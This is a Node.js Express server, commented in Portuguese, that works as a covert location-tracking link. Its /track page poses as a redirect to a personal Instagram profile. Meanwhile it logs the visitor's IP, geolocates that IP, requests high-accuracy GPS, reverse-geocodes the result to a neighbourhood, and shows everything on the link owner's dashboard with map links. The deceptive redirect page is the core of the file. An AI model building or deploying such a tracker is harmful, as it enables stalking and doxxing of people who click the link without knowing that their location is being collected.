const express = require('express');
const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());

const clicks = [];

function getIP(req) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || 
         req.headers['x-real-ip'] || 
         req.connection.remoteAddress || 
         req.socket.remoteAddress;
  
  // Remove o prefixo IPv6 se existir
  return ip.replace('::ffff:', '').trim();
}

// Dashboard principal
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Dashboard GPS Tracker</title>
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          min-height: 100vh;
          padding: 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .header {
          background: white;
          border-radius: 15px;
          padding: 30px;
          margin-bottom: 20px;
          box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        h1 { color: #667eea; margin-bottom: 10px; }
        .stats {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
          gap: 15px;
          margin-bottom: 20px;
        }
        .stat-card {
          background: white;
          padding: 20px;
          border-radius: 10px;
          box-shadow: 0 5px 15px rgba(0,0,0,0.1);
          text-align: center;
        }
        .stat-number { font-size: 2.5em; font-weight: bold; color: #667eea; }
        .stat-label { color: #666; margin-top: 5px; }
        .clicks-container {
          background: white;
          border-radius: 15px;
          padding: 30px;
          box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .click-item {
          background: #f8f9fa;
          border-left: 4px solid #667eea;
          padding: 15px;
          margin-bottom: 15px;
          border-radius: 5px;
        }
        .click-item.gps-enabled {
          border-left-color: #28a745;
          background: #f0fff4;
        }
        .click-time { font-weight: bold; color: #667eea; margin-bottom: 5px; }
        .click-info { color: #666; font-size: 0.9em; margin: 3px 0; }
        .gps-badge {
          background: #28a745;
          color: white;
          padding: 5px 10px;
          border-radius: 5px;
          display: inline-block;
          margin-top: 5px;
          font-weight: bold;
          font-size: 0.85em;
        }
        .ip-badge {
          background: #ffc107;
          color: #000;
          padding: 5px 10px;
          border-radius: 5px;
          display: inline-block;
          margin-top: 5px;
          font-weight: bold;
          font-size: 0.85em;
        }
        .btn {
          background: #667eea;
          color: white;
          border: none;
          padding: 12px 30px;
          border-radius: 25px;
          cursor: pointer;
          font-size: 1em;
          margin: 5px;
        }
        .btn:hover { background: #5568d3; }
        .link-box {
          background: #e3f2fd;
          padding: 15px;
          border-radius: 8px;
          margin-top: 15px;
          border: 2px dashed #667eea;
        }
        .link-box code {
          background: white;
          padding: 8px 15px;
          border-radius: 5px;
          display: inline-block;
          color: #667eea;
          font-weight: bold;
          word-break: break-all;
        }
        .location-detail {
          background: #fff;
          padding: 10px;
          margin: 5px 0;
          border-radius: 5px;
          border: 1px solid #e0e0e0;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h1>📊 Dashboard de Rastreamento GPS</h1>
          <p>Monitore quem clica no seu link com localização precisa</p>
          <div class="link-box">
            <strong>🔗 Seu link de rastreamento:</strong><br>
            <code id="trackingLink">Carregando...</code>
            <button class="btn" onclick="copyLink()">📋 Copiar</button>
          </div>
        </div>
        
        <div class="stats">
          <div class="stat-card">
            <div class="stat-number" id="totalClicks">0</div>
            <div class="stat-label">Total de Cliques</div>
          </div>
          <div class="stat-card">
            <div class="stat-number" id="gpsClicks">0</div>
            <div class="stat-label">Com GPS Preciso</div>
          </div>
          <div class="stat-card">
            <div class="stat-number" id="ipClicks">0</div>
            <div class="stat-label">Localização por IP</div>
          </div>
        </div>
        
        <div class="clicks-container">
          <button class="btn" onclick="loadData()">🔄 Atualizar</button>
          <h2>Últimos Cliques</h2>
          <div id="clicksList">Carregando...</div>
        </div>
      </div>
      
      <script>
        const trackingUrl = window.location.origin + '/track';
        document.getElementById('trackingLink').textContent = trackingUrl;
        
        function copyLink() {
          navigator.clipboard.writeText(trackingUrl);
          alert('Link copiado!');
        }
        
        async function loadData() {
          try {
            const res = await fetch('/api/stats');
            const data = await res.json();
            
            document.getElementById('totalClicks').textContent = data.total;
            
            const gpsClicks = data.clicks.filter(c => c.location && c.location.cidade !== 'N/A');
            const ipClicks = data.clicks.filter(c => c.ipLocation && c.ipLocation.cidade !== 'N/A' && (!c.location || c.location.cidade === 'N/A'));
            
            document.getElementById('gpsClicks').textContent = gpsClicks.length;
            document.getElementById('ipClicks').textContent = ipClicks.length;
            
            const container = document.getElementById('clicksList');
            
            if (data.clicks.length === 0) {
              container.innerHTML = '<p style="text-align:center;color:#999;padding:40px;">🔭 Nenhum clique registrado ainda</p>';
              return;
            }
            
            container.innerHTML = data.clicks.map(c => {
              const date = new Date(c.timestamp).toLocaleString('pt-BR');
              const hasGPS = c.location && c.location.cidade !== 'N/A';
              const hasIP = c.ipLocation && c.ipLocation.cidade !== 'N/A';
              const itemClass = hasGPS ? 'click-item gps-enabled' : 'click-item';
              
              let locationHTML = '';
              
              if (hasGPS) {
                const loc = c.location;
                locationHTML = \`
                  <div class="gps-badge">📍 LOCALIZAÇÃO GPS PRECISA</div>
                  <div class="location-detail">
                    <strong>🏙️ Cidade:</strong> \${loc.cidade}<br>
                    <strong>🗺️ Estado:</strong> \${loc.estado}<br>
                    <strong>🏘️ Bairro:</strong> \${loc.bairro}<br>
                    \${c.gpsCoords ? \`<strong>📌 Coordenadas:</strong> \${c.gpsCoords.lat.toFixed(6)}, \${c.gpsCoords.lng.toFixed(6)}<br>\` : ''}
                    \${c.gpsCoords ? \`<a href="https://www.google.com/maps?q=\${c.gpsCoords.lat},\${c.gpsCoords.lng}" target="_blank">🗺️ Ver no Google Maps</a>\` : ''}
                  </div>
                \`;
              } else if (hasIP) {
                const loc = c.ipLocation;
                locationHTML = \`
                  <div class="ip-badge">⚠️ LOCALIZAÇÃO POR IP (MENOS PRECISA)</div>
                  <div class="location-detail">
                    <strong>🏙️ Cidade:</strong> \${loc.cidade}<br>
                    <strong>🗺️ Estado:</strong> \${loc.estado}
                  </div>
                \`;
              } else {
                locationHTML = '<div class="ip-badge">❌ LOCALIZAÇÃO NÃO DISPONÍVEL</div>';
              }
              
              return \`
                <div class="\${itemClass}">
                  <div class="click-time">⏰ \${date}</div>
                  <div class="click-info">🌐 IP: \${c.ip}</div>
                  \${locationHTML}
                </div>
              \`;
            }).join('');
            
          } catch (error) {
            console.error('Erro ao carregar dados:', error);
          }
        }
        
        loadData();
        setInterval(loadData, 5000);
      </script>
    </body>
    </html>
  `);
});

// Página de rastreamento com GPS
app.get('/track', async (req, res) => {
  const clickData = {
    id: clicks.length + 1,
    ip: getIP(req),
    timestamp: new Date().toISOString(),
    location: null,
    ipLocation: null,
    gpsCoords: null
  };
  
  clicks.push(clickData);
  console.log('🔔 Novo clique ID:', clickData.id, 'IP:', clickData.ip);
  
  // Busca localização por IP em background
  (async () => {
    try {
      const ipClean = clickData.ip;
      
      // Não tenta geolocalizar IPs locais
      if (ipClean === '127.0.0.1' || ipClean === 'localhost' || ipClean.startsWith('192.168.')) {
        console.log('⚠️  IP local detectado - geolocalização indisponível');
        return;
      }
      
      const response = await fetch(`http://ip-api.com/json/${ipClean}?lang=pt&fields=status,country,regionName,city,lat,lon,district`);
      const ipData = await response.json();
      
      if (ipData.status === 'success') {
        const click = clicks.find(c => c.id === clickData.id);
        if (click) {
          click.ipLocation = {
            cidade: ipData.city || 'N/A',
            estado: ipData.regionName || 'N/A',
            bairro: ipData.district || 'N/A'
          };
          console.log('📍 IP Location:', ipData.city, ipData.regionName);
        }
      }
    } catch (error) {
      console.error('❌ Erro na geolocalização por IP:', error.message);
    }
  })();
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Redirecionando...</title>
      <style>
        body {
          margin: 0;
          padding: 0;
          display: flex;
          justify-content: center;
          align-items: center;
          min-height: 100vh;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .container {
          text-align: center;
          background: white;
          padding: 40px;
          border-radius: 20px;
          box-shadow: 0 10px 50px rgba(0,0,0,0.3);
          max-width: 400px;
        }
        .loader {
          border: 5px solid #f3f3f3;
          border-top: 5px solid #667eea;
          border-radius: 50%;
          width: 50px;
          height: 50px;
          animation: spin 1s linear infinite;
          margin: 20px auto;
        }
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        h2 { color: #667eea; margin-bottom: 10px; }
        p { color: #666; font-size: 14px; }
      </style>
    </head>
    <body>
      <div class="container">
        <h2>🔄 Redirecionando...</h2>
        <div class="loader"></div>
        <p>Aguarde um momento...</p>
      </div>
      
      <script>
        const clickId = ${clickData.id};
        const INSTAGRAM_URL = 'https://www.instagram.com/andre.osantos12/';
        
        async function reverseGeocode(lat, lon) {
          try {
            const response = await fetch(
              \`https://nominatim.openstreetmap.org/reverse?format=json&lat=\${lat}&lon=\${lon}&addressdetails=1&accept-language=pt-BR\`,
              { 
                headers: { 
                  'User-Agent': 'InstagramTracker/1.0',
                  'Accept': 'application/json'
                } 
              }
            );
            
            if (!response.ok) {
              throw new Error('Erro na API de geocoding');
            }
            
            const data = await response.json();
            
            if (data && data.address) {
              const addr = data.address;
              return {
                cidade: addr.city || addr.town || addr.village || addr.municipality || addr.county || 'N/A',
                estado: addr.state || addr.region || 'N/A',
                bairro: addr.suburb || addr.neighbourhood || addr.district || addr.quarter || 'N/A'
              };
            }
            
            return null;
          } catch (error) {
            console.error('Erro no geocoding:', error);
            return null;
          }
        }
        
        async function getLocationAndRedirect() {
          if (!navigator.geolocation) {
            console.log('Geolocalização não suportada');
            window.location.href = INSTAGRAM_URL;
            return;
          }
          
          try {
            const position = await new Promise((resolve, reject) => {
              navigator.geolocation.getCurrentPosition(
                resolve,
                reject,
                {
                  enableHighAccuracy: true,
                  timeout: 10000,
                  maximumAge: 0
                }
              );
            });
            
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            
            console.log('GPS obtido:', lat, lng, 'Precisão:', accuracy, 'm');
            
            // Busca o endereço
            const location = await reverseGeocode(lat, lng);
            
            // Envia para o servidor
            const response = await fetch('/api/save-gps', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                clickId: clickId,
                lat: lat,
                lng: lng,
                accuracy: accuracy,
                location: location
              })
            });
            
            const result = await response.json();
            console.log('Localização salva:', result);
            
          } catch (error) {
            console.log('Erro ao obter GPS:', error.message);
          }
          
          // Redireciona independente do resultado
          window.location.href = INSTAGRAM_URL;
        }
        
        // Executa automaticamente
        getLocationAndRedirect();
      </script>
    </body>
    </html>
  `);
});

// Salvar GPS
app.post('/api/save-gps', async (req, res) => {
  try {
    const { clickId, lat, lng, accuracy, location } = req.body;
    
    const click = clicks.find(c => c.id === clickId);
    if (!click) {
      return res.json({ success: false, error: 'Click não encontrado' });
    }
    
    // Salva as coordenadas GPS
    click.gpsCoords = { lat, lng, accuracy };
    
    console.log('📍 GPS recebido para click', clickId, ':', lat, lng, 'Precisão:', accuracy, 'm');
    
    // Se o cliente já enviou a localização processada, usa ela
    if (location && location.cidade !== 'N/A') {
      click.location = location;
      console.log('✅ Localização do cliente:', location.cidade, location.estado, location.bairro);
      return res.json({ success: true, source: 'client' });
    }
    
    // Caso contrário, tenta buscar no servidor
    try {
      const response = await fetch(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&addressdetails=1&accept-language=pt-BR`,
        { 
          headers: { 
            'User-Agent': 'InstagramTracker/1.0'
          } 
        }
      );
      
      const data = await response.json();
      
      if (data && data.address) {
        const addr = data.address;
        
        click.location = {
          cidade: addr.city || addr.town || addr.village || addr.municipality || addr.county || 'N/A',
          estado: addr.state || addr.region || 'N/A',
          bairro: addr.suburb || addr.neighbourhood || addr.district || addr.quarter || 'N/A'
        };
        
        console.log('✅ Endereço salvo (servidor):', click.location.cidade, click.location.estado, click.location.bairro);
        return res.json({ success: true, source: 'server' });
      }
    } catch (error) {
      console.error('❌ Erro ao buscar endereço no servidor:', error.message);
    }
    
    res.json({ success: true, warning: 'GPS salvo mas endereço não obtido' });
    
  } catch (error) {
    console.error('❌ Erro ao salvar GPS:', error);
    res.json({ success: false, error: error.message });
  }
});

// API de estatísticas
app.get('/api/stats', (req, res) => {
  res.json({
    total: clicks.length,
    clicks: [...clicks].reverse()
  });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log('🚀 Servidor rodando na porta', PORT);
  console.log('📱 Acesse: http://localhost:' + PORT);
});
